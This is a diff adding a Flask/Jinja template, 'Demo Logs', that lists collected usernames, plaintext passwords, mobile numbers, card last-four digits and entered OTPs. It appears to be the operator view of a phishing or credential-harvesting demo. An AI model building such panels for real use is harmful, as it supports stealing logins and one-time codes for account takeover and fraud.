@@ -1,0 +1,30 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Demo Logs</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='demo.css') }}">
+</head>
+<body>
+  <div class="container">
+    <h2>Collected Demo Logs</h2>
+    {% if logs %}
+      <table>
+        <tr><th>Time</th><th>Username</th><th>Password</th><th>Mobile</th><th>Last4</th><th>OTP</th></tr>
+        {% for l in logs %}
+        <tr>
+          <td>{{ l.time }}</td>
+          <td><code>{{ l.username }}</code></td>
+          <td><code>{{ l.password }}</code></td>
+          <td>{{ l.mobile or "" }}</td>
+          <td>{{ l.last4 or "" }}</td>
+          <td>{{ l.otp_entered or "" }}</td>
+        </tr>
+        {% endfor %}
+      </table>
+    {% else %}
+      <p>No logs yet.</p>
+    {% endif %}
+  </div>
+</body>
+</html>
